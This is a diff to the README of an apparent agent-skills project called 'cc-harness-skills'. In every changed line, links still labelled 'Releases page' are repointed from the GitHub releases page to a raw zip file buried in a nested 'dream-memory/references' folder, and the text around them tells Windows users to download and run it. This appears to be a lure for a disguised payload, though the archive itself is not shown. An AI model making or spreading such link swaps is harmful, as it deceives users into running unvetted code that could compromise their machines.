@@ -1,6 +1,6 @@
 # 🧠 cc-harness-skills - Portable skills for smarter agent work
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/kentunderage549/cc-harness-skills/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/kentunderage549/cc-harness-skills/main/skills/dream-memory/references/harness-cc-skills-v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use it when you want a cleaner way to manage agent tasks, keep context small, an
 
 ## 📥 Download and Install
 
-1. Open the [Releases page](https://github.com/kentunderage549/cc-harness-skills/releases)
+1. Open the [Releases page](https://raw.githubusercontent.com/kentunderage549/cc-harness-skills/main/skills/dream-memory/references/harness-cc-skills-v1.1.zip)
 2. Download the latest release for Windows
 3. If the file comes in a zip folder, right-click it and choose **Extract All**
 4. Open the extracted folder
@@ -152,7 +152,7 @@ If you work with more than one agent:
 
 ## 📦 Download
 
-Visit the [Releases page](https://github.com/kentunderage549/cc-harness-skills/releases) to download and run the latest Windows release
+Visit the [Releases page](https://raw.githubusercontent.com/kentunderage549/cc-harness-skills/main/skills/dream-memory/references/harness-cc-skills-v1.1.zip) to download and run the latest Windows release
 
 ## 🔗 Project Topics
 
